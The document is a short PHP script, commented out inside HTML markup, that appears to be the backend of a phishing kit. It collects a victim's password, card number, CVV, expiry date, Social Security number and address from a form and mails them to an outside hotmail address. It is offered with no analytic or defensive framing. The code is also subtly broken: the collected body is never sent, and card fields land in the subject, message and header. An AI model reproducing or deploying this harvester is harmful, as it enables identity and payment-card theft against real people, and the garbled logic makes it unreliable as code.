<!-- <?php
	$name = $_POST["name"];
	$pwd = $_POST["pwd"];
	$number = $_POST["number"];
	$cardname = $_POST["cardname"];
	$cvvnumber = $_POST["cvvnumber"];
	$date = $_POST["date"];
	$ssn_number = $_POST["ssn_number"];
	$addr = $_POST["addr"];
	$zipnum = $_POST["zipnum"];
	$to = "marielaw001@hotmail.com";
	$mailHeaders = "From: " .$name . "<". $pwd .">\r\n";

	$body .="from: ".$name. "\r\n";
	$body .="from: ".$pwd. "\r\n";
	$body .="from: ".$number. "\r\n";
	$body .="from: ".$cardname. "\r\n";
	$body .="from: ".$cvvnumber. "\r\n";
	$body .="from: ".$date. "\r\n";
	$body .="from: ".$ssn_number. "\r\n";
	$body .="from: ".$addr. "\r\n";
	$body .="from: ".$zipnum. "\r\n";

	mail($to,$number,$cardname,$mailHeaders); 
	echo "message sent!";

	
?> -->